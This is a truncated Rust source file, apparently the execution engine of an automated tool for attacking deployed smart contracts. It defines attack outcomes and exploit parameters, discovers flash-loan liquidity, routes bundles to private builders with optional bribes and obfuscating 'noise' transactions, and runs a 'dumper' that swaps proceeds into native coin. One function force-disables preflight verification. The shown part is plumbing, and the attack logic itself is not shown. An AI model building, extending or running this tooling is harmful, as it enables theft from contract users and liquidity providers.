pub mod access_list;
pub mod builders;
pub mod execution_policy;
pub mod gas_solver;
pub mod invariant_anchors;
pub mod jit_migration;
pub mod multi_block;
pub mod payload_hardening;
pub mod pinning_anchor;
pub mod timelock_sniper;
pub mod tip_auto_scaler;
pub mod verifier;
pub mod watch_cache;

use crate::solver::objectives::ExploitParams;
use crate::storage::contracts_db::ContractsDb;
use crate::utils::rpc::RobustRpc;
use alloy::eips::eip2718::Encodable2718;
use alloy::network::{EthereumWallet, TransactionBuilder};
use alloy::primitives::aliases::U24;
use alloy::primitives::{address, Address, Bytes as AlloyBytes, U160, U256};
use alloy::providers::{Provider, ProviderBuilder, RootProvider};
use alloy::rpc::types::eth::TransactionRequest;
use alloy::signers::local::PrivateKeySigner;
use alloy::sol_types::SolCall;
use alloy::transports::http::Http;
use dashmap::DashMap;
use reqwest::Client;
use std::sync::{
    atomic::{AtomicU64, Ordering},
    Arc, Mutex as StdMutex, OnceLock,
};

use crate::protocols::flash_loan::{
    AaveV3Provider, BalancerProvider, FlashLoanProvider, FlashLoanProviderKind,
    FlashLoanProviderSpec, UniswapV2PairProvider, UniswapV3PoolProvider,
};
use std::str::FromStr;
use tokio::sync::Mutex;

use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use crate::utils::config::Config;

/// Noise transactions are bundle obfuscation. Default is 0 for speed; enable explicitly if desired.
pub const NOISE_TXS_PER_BUNDLE: usize = 0;
const MAX_NOISE_TXS_PER_BUNDLE: usize = 3;
const BUILDER_ROUTING_SAMPLE_LIMIT: usize = 300;
const DEFAULT_BUILDER_ROUTING_CACHE_TTL_MS: u64 = 5_000;
const DEFAULT_GAS_SOLVER_CACHE_TTL_MS: u64 = 1_000;
const MAX_CONDITIONAL_STORAGE_CHECKS: usize = 24;
const DEFAULT_CONDITIONAL_STORAGE_PREFETCH_TIMEOUT_MS: u64 = 250;
const DEFAULT_CONDITIONAL_STORAGE_PREFETCH_CONCURRENCY: usize = 6;
const DEFAULT_EXECUTOR_VERBOSE_HOTPATH_LOGS: bool = false;
const DEFAULT_PRICE_CONFIDENCE_MAX_UNPRICED_TOKENS: usize = 5;
const DEFAULT_PRICE_CONFIDENCE_MAX_STALE_PRICED_TOKENS: usize = 4;
const DEFAULT_VOLATILITY_CIRCUIT_BREAKER_ENABLED: bool = true;
const DEFAULT_VOLATILITY_BASE_FEE_THRESHOLD_WEI: u128 = 500_000_000_000; // 500 gwei
const DEFAULT_VOLATILITY_CONSECUTIVE_LOSSES_THRESHOLD: u64 = 8;
const DEFAULT_VOLATILITY_RPC_LATENCY_THRESHOLD_MS: u64 = 2_500;
const DEFAULT_VOLATILITY_DEFENSIVE_TIP_SCALE_BPS: u64 = 8_500; // 85%
const BUILDER_MICROPROFILE_EMA_ALPHA_BPS: u64 = 2_500; // 25%
const DEFAULT_DUMPER_ENABLED: bool = true;
const DEFAULT_DUMPER_SWAP_DEADLINE_SECS: u64 = 120;
const DEFAULT_DUMPER_V3_FEE_BPS: u32 = 3_000;
const DEFAULT_DUMPER_UNWRAP_TO_NATIVE: bool = true;
const DEFAULT_COINBASE_BRIBE_ENABLED: bool = false;
const DEFAULT_COINBASE_BRIBE_BPS: u64 = 9_900;
const DEFAULT_FLASH_LOAN_CAPACITY_PROBE_ENABLED: bool = true;
const DEFAULT_FLASH_LOAN_CAPACITY_PROBE_STRICT: bool = true;
const DEFAULT_FLASH_LOAN_CAPACITY_PROBE_TIMEOUT_MS: u64 = 120;
const DEFAULT_FLASH_LOAN_CAPACITY_CACHE_TTL_MS: u64 = 1_500;
const DEFAULT_FLASH_LOAN_DISCOVERY_ENABLED: bool = true;
const DEFAULT_FLASH_LOAN_DISCOVERY_TIMEOUT_MS: u64 = 120;
const DEFAULT_FLASH_LOAN_DISCOVERY_CACHE_TTL_MS: u64 = 30_000;
const COINBASE_BRIBE_BUILDER_HINTS: [&str; 2] = ["beaverbuild", "titanbuilder"];

fn executor_verbose_hotpath_logs_enabled() -> bool {
    static ENABLED: OnceLock<bool> = OnceLock::new();
    *ENABLED.get_or_init(|| {
        std::env::var("EXECUTOR_VERBOSE_HOTPATH_LOGS")
            .ok()
            .map(|v| {
                matches!(
                    v.trim().to_ascii_lowercase().as_str(),
                    "1" | "true" | "yes" | "on"
                )
            })
            .unwrap_or(DEFAULT_EXECUTOR_VERBOSE_HOTPATH_LOGS)
    })
}

macro_rules! println {
    ($($arg:tt)*) => {{
        if executor_verbose_hotpath_logs_enabled() {
            ::std::println!($($arg)*);
        }
    }};
}

macro_rules! eprintln {
    ($($arg:tt)*) => {{
        if executor_verbose_hotpath_logs_enabled() {
            ::std::eprintln!($($arg)*);
        }
    }};
}

pub fn noise_bundle_tx_count() -> usize {
    match std::env::var("NOISE_TXS_PER_BUNDLE") {
        Ok(raw) => raw
            .trim()
            .parse::<usize>()
            .ok()
            .map(|v| v.min(MAX_NOISE_TXS_PER_BUNDLE))
            .unwrap_or(NOISE_TXS_PER_BUNDLE),
        Err(_) => NOISE_TXS_PER_BUNDLE,
    }
}

pub fn build_noise_marker(block_offset: u64, noise_index: u64, nonce: u64) -> AlloyBytes {
    let mut marker = [0u8; 32];
    marker[0..4].copy_from_slice(b"NOIS");
    marker[4..12].copy_from_slice(&block_offset.to_be_bytes());
    marker[12..20].copy_from_slice(&nonce.to_be_bytes());
    marker[20..28].copy_from_slice(&noise_index.to_be_bytes());
    AlloyBytes::from(marker.to_vec())
}

fn u256_to_u128_saturating(value: U256) -> u128 {
    let bytes = value.to_be_bytes::<32>();
    if bytes[..16].iter().any(|b| *b != 0) {
        u128::MAX
    } else {
        let mut tail = [0u8; 16];
        tail.copy_from_slice(&bytes[16..32]);
        u128::from_be_bytes(tail)
    }
}

fn load_realtime_replay_validation_enabled() -> bool {
    false // NUCLEAR OPTION: Force disable preflight verification to guarantee delivery
}

fn load_realtime_replay_validation_timeout_ms() -> u64 {
    30_000 // Give any surviving replays a massive 30-second window to resolve, preventing drops
}

fn load_conditional_storage_prefetch_timeout_ms() -> u64 {
    std::env::var("CONDITIONAL_STORAGE_PREFETCH_TIMEOUT_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(25, 2_000))
        .unwrap_or(DEFAULT_CONDITIONAL_STORAGE_PREFETCH_TIMEOUT_MS)
}

fn load_conditional_storage_prefetch_concurrency() -> usize {
    std::env::var("CONDITIONAL_STORAGE_PREFETCH_CONCURRENCY")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .map(|v| v.clamp(1, MAX_CONDITIONAL_STORAGE_CHECKS))
        .unwrap_or(DEFAULT_CONDITIONAL_STORAGE_PREFETCH_CONCURRENCY)
}

fn load_dumper_enabled() -> bool {
    std::env::var("DUMPER_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_DUMPER_ENABLED)
}

fn load_dumper_swap_deadline_secs() -> u64 {
    std::env::var("DUMPER_SWAP_DEADLINE_SECS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(30, 1_200))
        .unwrap_or(DEFAULT_DUMPER_SWAP_DEADLINE_SECS)
}

fn load_dumper_v3_fee() -> U24 {
    let fee = std::env::var("DUMPER_V3_FEE_BPS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u32>().ok())
        .map(|v| v.clamp(100, 10_000))
        .unwrap_or(DEFAULT_DUMPER_V3_FEE_BPS);
    U24::from(fee)
}

fn load_dumper_unwrap_to_native() -> bool {
    std::env::var("DUMPER_UNWRAP_TO_NATIVE")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_DUMPER_UNWRAP_TO_NATIVE)
}

fn load_coinbase_bribe_enabled() -> bool {
    std::env::var("COINBASE_BRIBE_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_COINBASE_BRIBE_ENABLED)
}

fn load_coinbase_bribe_threshold_wei() -> U256 {
    std::env::var("COINBASE_BRIBE_THRESHOLD_WEI")
        .ok()
        .and_then(|raw| U256::from_str(raw.trim()).ok())
        .unwrap_or(U256::from(1_000_000_000_000_000_000u128))
}

fn load_coinbase_bribe_bps() -> u64 {
    std::env::var("COINBASE_BRIBE_BPS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(1, 9_999))
        .unwrap_or(DEFAULT_COINBASE_BRIBE_BPS)
}

fn load_coinbase_bribe_contract() -> Option<Address> {
    std::env::var("COINBASE_BRIBE_CONTRACT")
        .ok()
        .and_then(|raw| Address::from_str(raw.trim()).ok())
}

fn load_flash_loan_capacity_probe_enabled() -> bool {
    std::env::var("FLASH_LOAN_CAPACITY_PROBE_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_FLASH_LOAN_CAPACITY_PROBE_ENABLED)
}

fn load_flash_loan_capacity_probe_strict() -> bool {
    std::env::var("FLASH_LOAN_CAPACITY_PROBE_STRICT")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_FLASH_LOAN_CAPACITY_PROBE_STRICT)
}

fn load_flash_loan_capacity_probe_timeout_ms() -> u64 {
    std::env::var("FLASH_LOAN_CAPACITY_PROBE_TIMEOUT_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(40, 1_500))
        .unwrap_or(DEFAULT_FLASH_LOAN_CAPACITY_PROBE_TIMEOUT_MS)
}

fn load_flash_loan_capacity_cache_ttl_ms() -> u64 {
    std::env::var("FLASH_LOAN_CAPACITY_CACHE_TTL_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(100, 60_000))
        .unwrap_or(DEFAULT_FLASH_LOAN_CAPACITY_CACHE_TTL_MS)
}

fn load_flash_loan_discovery_enabled() -> bool {
    std::env::var("FLASH_LOAN_DISCOVERY_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_FLASH_LOAN_DISCOVERY_ENABLED)
}

fn load_flash_loan_discovery_timeout_ms() -> u64 {
    std::env::var("FLASH_LOAN_DISCOVERY_TIMEOUT_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(40, 1_500))
        .unwrap_or(DEFAULT_FLASH_LOAN_DISCOVERY_TIMEOUT_MS)
}

fn load_flash_loan_discovery_cache_ttl_ms() -> u64 {
    std::env::var("FLASH_LOAN_DISCOVERY_CACHE_TTL_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(250, 300_000))
        .unwrap_or(DEFAULT_FLASH_LOAN_DISCOVERY_CACHE_TTL_MS)
}

fn parse_env_address_list(var: &str) -> Vec<Address> {
    std::env::var(var)
        .ok()
        .map(|raw| {
            raw.split(|ch: char| ch == ',' || ch == ';' || ch.is_ascii_whitespace())
                .filter_map(|entry| {
                    let trimmed = entry.trim();
                    if trimmed.is_empty() {
                        return None;
                    }
                    Address::from_str(trimmed).ok()
                })
                .collect::<Vec<_>>()
        })
        .unwrap_or_default()
}

fn load_flash_loan_discovery_v2_factories() -> Vec<Address> {
    parse_env_address_list("FLASH_LOAN_DISCOVERY_V2_FACTORIES")
}

fn load_flash_loan_discovery_v3_factories() -> Vec<Address> {
    parse_env_address_list("FLASH_LOAN_DISCOVERY_V3_FACTORIES")
}

fn load_flash_loan_discovery_v3_fees() -> Vec<u32> {
    let mut fees = std::env::var("FLASH_LOAN_DISCOVERY_V3_FEES")
        .ok()
        .map(|raw| {
            raw.split(|ch: char| ch == ',' || ch == ';' || ch.is_ascii_whitespace())
                .filter_map(|entry| entry.trim().parse::<u32>().ok())
                .filter(|tier| *tier > 0 && *tier <= 100_000)
                .collect::<Vec<_>>()
        })
        .unwrap_or_else(|| vec![500, 3_000, 10_000]);
    fees.sort_unstable();
    fees.dedup();
    fees
}

alloy::sol! {
    interface ICoinbaseBribe {
        function bribe() external payable;
    }

    interface IERC20 {
        function approve(address spender, uint256 amount) external returns (bool);
        function balanceOf(address owner) external view returns (uint256 balance);
    }

    interface IWETH9 {
        function withdraw(uint256 wad) external;
    }

    interface IUniswapV2Router02 {
        function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
    }

    interface IUniswapV3Router {
        struct ExactInputSingleParams {
            address tokenIn;
            address tokenOut;
            uint24 fee;
            address recipient;
            uint256 deadline;
            uint256 amountIn;
            uint256 amountOutMinimum;
            uint160 sqrtPriceLimitX96;
        }

        function exactInputSingle(ExactInputSingleParams calldata params)
            external
            payable
            returns (uint256 amountOut);
    }

    interface IAaveV3PoolLiquidity {
        function getReserveData(address asset) external view returns (
            uint256 configuration,
            uint128 liquidityIndex,
            uint128 currentLiquidityRate,
            uint128 variableBorrowIndex,
            uint128 currentVariableBorrowRate,
            uint128 currentStableBorrowRate,
            uint40 lastUpdateTimestamp,
            uint16 id,
            address aTokenAddress,
            address stableDebtTokenAddress,
            address variableDebtTokenAddress,
            address interestRateStrategyAddress,
            uint128 accruedToTreasury,
            uint128 unbacked,
            uint128 isolationModeTotalDebt
        );
    }

    interface IUniswapV2FactoryView {
        function getPair(address tokenA, address tokenB) external view returns (address pair);
    }

    interface IUniswapV3FactoryView {
        function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
    }
}

fn get_dumper_router(chain_id: u64) -> Option<(Address, bool)> {
    // Returns `(router, is_v3_router)`.
    match chain_id {
        1 => Some((address!("E592427A0AEce92De3Edee1F18E0157C05861564"), true)),
        8453 => Some((address!("2626664c2603336E57B271c5C0b26F421741e481"), true)),
        10 => Some((address!("E592427A0AEce92De3Edee1F18E0157C05861564"), true)),
        42161 => Some((address!("E592427A0AEce92De3Edee1F18E0157C05861564"), true)),
        56 => Some((address!("10ED43C718714eb63d5aA57B78B54704E256024E"), false)),
        137 => Some((address!("E592427A0AEce92De3Edee1F18E0157C05861564"), true)),
        _ => None,
    }
}

fn is_coinbase_bribe_builder_url(raw: &str) -> bool {
    let lowered = raw.trim().to_ascii_lowercase();
    COINBASE_BRIBE_BUILDER_HINTS
        .iter()
        .any(|hint| lowered.contains(hint))
}

fn has_coinbase_bribe_route(builder_urls: &[String]) -> bool {
    builder_urls
        .iter()
        .any(|url| is_coinbase_bribe_builder_url(url))
}

fn resolve_builder_urls(config: &Config) -> Vec<String> {
    if !config.builder_urls.is_empty() {
        return config.builder_urls.clone();
    }
    if let Some(relay) = config.flashbots_relay_url.as_ref() {
        return vec![relay.clone()];
    }
    crate::config::chains::ChainConfig::default_private_builder_urls(config.chain_id)
}

#[derive(Debug, Clone, Default)]
pub struct AttackExecutionFeedback {
    pub learned_lemma: bool,
    pub competition_rejected: bool,
    pub outcome: AttackOutcome,
    pub included: Option<bool>,
    pub reverted: Option<bool>,
    pub tip_wei: Option<u128>,
    pub max_fee_wei: Option<u128>,
    pub replay_completed_ms: Option<u64>,
    pub send_completed_ms: Option<u64>,
    pub builder_outcomes: Vec<BuilderDispatchOutcome>,
}

#[derive(Debug, Clone)]
pub struct AttackExecutionContext {
    pub target_solve_block: u64,
    pub solve_duration_ms: u128,
    pub require_late_solve_preflight: bool,
    pub solve_completed_ms: u64,
    pub tip_auto_scale_contested: bool,
    /// If present, this report is treated as the verified pinned-block replay for this execution
    /// and the executor will not re-run the local shadow simulation before relay.
    pub verified_shadow_report: Option<verifier::ShadowSimulationReport>,
}

#[derive(Debug, Clone, Default)]
pub struct BuilderDispatchOutcome {
    pub builder: String,
    pub accepted: bool,
    pub latency_ms: u64,
    pub rejection_class: Option<String>,
    pub response_message: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum AttackOutcome {
    #[default]
    Attempted,
    SimulatedOnly,
    DroppedShadowFail,
    DroppedHoneypot,
    DroppedGasGrief,
    DroppedUnprofitable,
    DroppedPriceConfidence,
    DroppedPreflight,
    DroppedConditional,
    DroppedStale,
    DroppedHandshake,
    Sent,
}

pub fn is_competition_rejection_message(message: &str) -> bool {
    let m = message.to_ascii_lowercase();
    [
        "underpriced",
        "replacement transaction underpriced",
        "nonce too low",
        "already known",
        "already imported",
        "bundle already",
        "account has nonce",
        "txpool conflict",
        "max fee per gas less than block base fee",
        "competition",
        "outbid",
    ]
    .iter()
    .any(|needle| m.contains(needle))
}

pub fn is_bundle_received_hint(message: &str) -> bool {
    message.to_ascii_lowercase().contains("bundle received")
}

pub fn builder_outcomes_have_competition_hint(outcomes: &[BuilderDispatchOutcome]) -> bool {
    outcomes.iter().any(|outcome| {
        outcome
            .response_message
            .as_deref()
            .is_some_and(is_competition_rejection_message)
    })
}

pub fn bundle_received_builders(outcomes: &[BuilderDispatchOutcome]) -> Vec<String> {
    let mut out = outcomes
        .iter()
        .filter_map(|outcome| {
            outcome
                .response_message
                .as_deref()
                .filter(|message| is_bundle_received_hint(message))
                .map(|_| outcome.builder.clone())
        })
        .collect::<Vec<_>>();
    out.sort();
    out.dedup();
    out
}

fn should_trigger_self_heal_on_competition(
    results: &[crate::error::Result<builders::BundleResponse>],
) -> bool {
    let mut any_accepted = false;
    let mut competition_rejected = false;

    for result in results {
        match result {
            Ok(resp) if resp.accepted => {
                any_accepted = true;
            }
            Ok(resp) => {
                if let Some(message) = &resp.message {
                    if is_competition_rejection_message(message) {
                        competition_rejected = true;
                    }
                }
            }
            Err(err) => {
                if is_competition_rejection_message(&format!("{err:?}")) {
                    competition_rejected = true;
                }
            }
        }
    }

    !any_accepted && competition_rejected
}

fn is_stale_solve(current_latest_block: u64, target_solve_block: u64) -> bool {
    current_latest_block > target_solve_block.saturating_add(1)
}

static LAST_EXECUTOR_NOW_MS: AtomicU64 = AtomicU64::new(1);

fn normalize_executor_now_ms(sample_ms: Option<u64>) -> u64 {
    let mut prev = LAST_EXECUTOR_NOW_MS.load(Ordering::Relaxed);
    loop {
        let normalized = sample_ms.unwrap_or(prev).max(prev).max(1);
        match LAST_EXECUTOR_NOW_MS.compare_exchange_weak(
            prev,
            normalized,
            Ordering::Relaxed,
            Ordering::Relaxed,
        ) {
            Ok(_) => return normalized,
            Err(actual) => prev = actual,
        }
    }
}

fn now_ms() -> u64 {
    let sample = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .ok()
        .map(|d| d.as_millis() as u64);
    normalize_executor_now_ms(sample)
}

#[derive(Clone)]
struct FlashLoanDiscoveryCacheEntry {
    fetched_ms: u64,
    specs: Vec<FlashLoanProviderSpec>,
}

#[derive(Clone, Copy)]
struct FlashLoanCapacityCacheEntry {
    fetched_ms: u64,
    capacity: Option<U256>,
}

fn flash_loan_discovery_cache(
) -> &'static StdMutex<HashMap<(u64, u64), FlashLoanDiscoveryCacheEntry>> {
    static CACHE: OnceLock<StdMutex<HashMap<(u64, u64), FlashLoanDiscoveryCacheEntry>>> =
        OnceLock::new();
    CACHE.get_or_init(|| StdMutex::new(HashMap::new()))
}

fn flash_loan_capacity_cache(
) -> &'static StdMutex<HashMap<(Address, Address), FlashLoanCapacityCacheEntry>> {
    static CACHE: OnceLock<StdMutex<HashMap<(Address, Address), FlashLoanCapacityCacheEntry>>> =
        OnceLock::new();
    CACHE.get_or_init(|| StdMutex::new(HashMap::new()))
}

fn flash_loan_discovery_key(chain_id: u64, tokens: &[Address]) -> (u64, u64) {
    let mut acc = 0xcbf29ce484222325u64;
    for token in tokens {
        for b in token.as_slice() {
            acc ^= u64::from(*b);
            acc = acc.wrapping_mul(0x100000001b3);
        }
    }
    (chain_id, acc)
}

struct BuilderRankingWarnState {
    last_log: Instant,
    suppressed: u64,
}

fn warn_builder_ranking_throttled(message: String) {
    static STATE: OnceLock<StdMutex<BuilderRankingWarnState>> = OnceLock::new();
    let state = STATE.get_or_init(|| {
        let now = Instant::now();
        let initial = now.checked_sub(Duration::from_secs(30)).unwrap_or(now);
        StdMutex::new(BuilderRankingWarnState {
            last_log: initial,
            suppressed: 0,
        })
    });

    let mut guard = match state.lock() {
        Ok(g) => g,
        Err(p) => p.into_inner(),
    };
    let now = Instant::now();
    if now.duration_since(guard.last_log) >= Duration::from_secs(10) {
        if guard.suppressed > 0 {
            tracing::warn!(
                "{} ({} similar builder-ranking warning(s) suppressed)",
                message,
                guard.suppressed
            );
            guard.suppressed = 0;
        } else {
            tracing::warn!("{}", message);
        }
        guard.last_log = now;
    } else {
        guard.suppressed = guard.suppressed.saturating_add(1);
    }
}

fn freshness_sla_budgets_ms(chain_id: u64) -> (u64, u64) {
    let block_time_ms = crate::config::chains::ChainConfig::get(chain_id)
        .block_time_ms
        .max(1);
    let solve_to_replay_max_ms = block_time_ms.saturating_mul(6).max(2_000);
    let replay_to_send_max_ms = block_time_ms.saturating_mul(3).max(1_000);
    (solve_to_replay_max_ms, replay_to_send_max_ms)
}

fn looks_like_revert_error(message: &str) -> bool {
    let m = message.to_ascii_lowercase();
    m.contains("revert") || m.contains("invalid opcode") || m.contains("panic")
}

fn classify_rejection_class(message: &str) -> Option<String> {
    let m = message.to_ascii_lowercase();
    if m.is_empty() {
        return None;
    }
    if is_competition_rejection_message(&m) {
        return Some("outbid".to_string());
    }
    if m.contains("stale") || m.contains("late") {
        return Some("late".to_string());
    }
    if looks_like_revert_error(&m) {
        return Some("reverted".to_string());
    }
    Some("other_reject".to_string())
}

fn load_price_confidence_gate_enabled() -> bool {
    match std::env::var("PRICE_CONFIDENCE_GATE_ENABLED") {
        Ok(v) => matches!(
            v.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        ),
        Err(_) => true,
    }
}

fn load_price_confidence_max_unpriced_tokens() -> usize {
    std::env::var("PRICE_CONFIDENCE_MAX_UNPRICED_TOKENS")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .unwrap_or(DEFAULT_PRICE_CONFIDENCE_MAX_UNPRICED_TOKENS)
}

fn load_price_confidence_max_stale_tokens() -> usize {
    std::env::var("PRICE_CONFIDENCE_MAX_STALE_PRICED_TOKENS")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .unwrap_or(DEFAULT_PRICE_CONFIDENCE_MAX_STALE_PRICED_TOKENS)
}

fn load_opstack_l1_fee_strict_enabled() -> bool {
    // Default false: Base L1 fees are typically negligible relative to modeled value delta.
    // Dropping a profitable bundle because the L1 oracle is slow costs more than overpaying by <$0.01.
    std::env::var("OPSTACK_L1_FEE_STRICT")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(false)
}

fn load_volatility_circuit_breaker_enabled() -> bool {
    std::env::var("VOLATILITY_CIRCUIT_BREAKERS_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_VOLATILITY_CIRCUIT_BREAKER_ENABLED)
}

fn load_volatility_base_fee_threshold_wei() -> u128 {
    std::env::var("VOLATILITY_BASE_FEE_THRESHOLD_WEI")
        .ok()
        .and_then(|raw| raw.trim().parse::<u128>().ok())
        .unwrap_or(DEFAULT_VOLATILITY_BASE_FEE_THRESHOLD_WEI)
}

fn load_volatility_consecutive_losses_threshold() -> u64 {
    std::env::var("VOLATILITY_CONSECUTIVE_LOSSES_THRESHOLD")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .unwrap_or(DEFAULT_VOLATILITY_CONSECUTIVE_LOSSES_THRESHOLD)
}

fn load_volatility_rpc_latency_threshold_ms() -> u64 {
    std::env::var("VOLATILITY_RPC_LATENCY_THRESHOLD_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .unwrap_or(DEFAULT_VOLATILITY_RPC_LATENCY_THRESHOLD_MS)
}

fn load_volatility_defensive_tip_scale_bps() -> u64 {
    std::env::var("VOLATILITY_DEFENSIVE_TIP_SCALE_BPS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(1_000, 10_000))
        .unwrap_or(DEFAULT_VOLATILITY_DEFENSIVE_TIP_SCALE_BPS)
}

fn load_dynamic_gas_escrow_enabled() -> bool {
    std::env::var("DYNAMIC_GAS_ESCROW_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(true)
}

fn load_builder_routing_cache_ttl_ms() -> u64 {
    std::env::var("BUILDER_ROUTING_CACHE_TTL_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(250, 120_000))
        .unwrap_or(DEFAULT_BUILDER_ROUTING_CACHE_TTL_MS)
}

fn load_gas_solver_cache_ttl_ms() -> u64 {
    std::env::var("GAS_SOLVER_CACHE_TTL_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(100, 30_000))
        .unwrap_or(DEFAULT_GAS_SOLVER_CACHE_TTL_MS)
}

fn builder_routing_cache() -> &'static StdMutex<(u64, Vec<String>)> {
    static CACHE: OnceLock<StdMutex<(u64, Vec<String>)>> = OnceLock::new();
    CACHE.get_or_init(|| StdMutex::new((0, Vec::new())))
}

fn builder_latency_profile() -> &'static DashMap<String, u64> {
    static PROFILE: OnceLock<DashMap<String, u64>> = OnceLock::new();
    PROFILE.get_or_init(DashMap::new)
}

fn record_builder_latency_sample(builder: &str, sample_us: u64) {
    let key = builder.to_ascii_lowercase();
    let alpha = BUILDER_MICROPROFILE_EMA_ALPHA_BPS as u128;
    let one = 10_000u128;
    builder_latency_profile()
        .entry(key)
        .and_modify(|ema| {
            let current = *ema as u128;
            let sample = sample_us as u128;
            let next = current
                .saturating_mul(one.saturating_sub(alpha))
                .saturating_add(sample.saturating_mul(alpha))
                / one;
            *ema = next as u64;
        })
        .or_insert(sample_us);
}

fn apply_builder_micro_latency_ranking(order: Vec<String>) -> Vec<String> {
    if order.is_empty() {
        return order;
    }
    let mut ranked = order;
    ranked.sort_by(|a, b| {
        let la = builder_latency_profile()
            .get(&a.to_ascii_lowercase())
            .map(|v| *v)
            .unwrap_or(u64::MAX);
        let lb = builder_latency_profile()
            .get(&b.to_ascii_lowercase())
            .map(|v| *v)
            .unwrap_or(u64::MAX);
        la.cmp(&lb).then_with(|| a.cmp(b))
    });
    ranked
}

fn volatility_loss_streak() -> &'static AtomicU64 {
    static STREAK: OnceLock<AtomicU64> = OnceLock::new();
    STREAK.get_or_init(|| AtomicU64::new(0))
}

pub fn record_circuit_breaker_feedback(feedback: &AttackExecutionFeedback) {
    let win = feedback.included == Some(true);
    if win {
        volatility_loss_streak().store(0, Ordering::Relaxed);
    } else {
        volatility_loss_streak().fetch_add(1, Ordering::Relaxed);
    }
}

fn builder_routing_score(row: &crate::storage::contracts_db::BuilderRoutingStats) -> i128 {
    if row.attempts == 0 {
        return i128::MIN / 4;
    }

    let attempts = row.attempts as i128;
    let accepted = row.accepted.min(row.attempts) as i128;
    let outbid = row.outbid_rejections.min(row.attempts) as i128;
    let success_bp = (accepted * 10_000) / attempts;
    let outbid_bp = (outbid * 10_000) / attempts;
    let latency_ms = if row.avg_latency_ms.is_finite() && row.avg_latency_ms.is_sign_positive() {
        row.avg_latency_ms
    } else {
        0.0
    };
    let latency_penalty = (latency_ms * 10.0).round() as i128;

    // Prioritize inclusion reliability first, then outbid resistance, then latency.
    success_bp * 100 - outbid_bp * 40 - latency_penalty
}

fn ranked_builders_from_db() -> Vec<String> {
    let now = now_ms();
    let ttl_ms = load_builder_routing_cache_ttl_ms();
    let mut cached = {
        let guard = match builder_routing_cache().lock() {
            Ok(g) => g,
            Err(p) => {
                warn_builder_ranking_throttled(
                    "[EXEC] Builder routing cache lock poisoned; recovering cached ranking."
                        .to_string(),
                );
                p.into_inner()
            }
        };
        (*guard).clone()
    };
    cached.1 = apply_builder_micro_latency_ranking(cached.1);
    if !cached.1.is_empty() && now.saturating_sub(cached.0) <= ttl_ms {
        return cached.1;
    }

    let db = match ContractsDb::open_default() {
        Ok(db) => db,
        Err(err) => {
            warn_builder_ranking_throttled(format!(
                "[EXEC] Builder ranking DB open failed: {}. Falling back to cached order (len={}).",
                err,
                cached.1.len()
            ));
            // Fail-closed fallback invariant: Err(_) => return cached.1
            return cached.1;
        }
    };
    let mut stats = match db.builder_routing_stats(BUILDER_ROUTING_SAMPLE_LIMIT) {
        Ok(rows) => rows,
        Err(err) => {
            warn_builder_ranking_throttled(format!(
                "[EXEC] Builder ranking stats query failed: {}. Falling back to cached order (len={}).",
                err,
                cached.1.len()
            ));
            // Fail-closed fallback invariant: Err(_) => return cached.1
            return cached.1;
        }
    };
    if stats.is_empty() {
        return cached.1;
    }

    stats.sort_by(|a, b| {
        builder_routing_score(b)
            .cmp(&builder_routing_score(a))
            .then_with(|| a.builder.cmp(&b.builder))
    });

    let ranked: Vec<String> = stats.into_iter().map(|row| row.builder).collect();
    let ranked = apply_builder_micro_latency_ranking(ranked);
    let mut cache_guard = match builder_routing_cache().lock() {
